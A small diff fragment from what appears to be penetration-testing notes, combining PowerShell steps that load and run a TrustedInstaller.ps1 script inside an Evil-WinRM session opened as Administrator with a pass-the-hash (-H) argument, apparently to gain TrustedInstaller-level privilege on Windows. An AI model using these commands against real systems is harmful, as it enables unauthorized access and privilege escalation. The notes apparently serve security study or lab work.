@@ -17,15 +17,11 @@ evil-winrm -i x.x.x.x -u Administrator -H 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 <SNIP>
 ```
 ```powershell
-*Evil-WinRM* PS C:\> TrustedInstaller.ps1
+*Evil-WinRM* PS C:\> TrustedInstaller.ps1; Invoke-TrustedInstaller
 ```
 
 ```powershell
-Import-Module .\TrustedInstaller.ps1
-```
-
-```powershell
-Invoke-TrustedInstaller
+Import-Module .\TrustedInstaller.ps1; Invoke-TrustedInstaller
 ```
 
 ```powershell
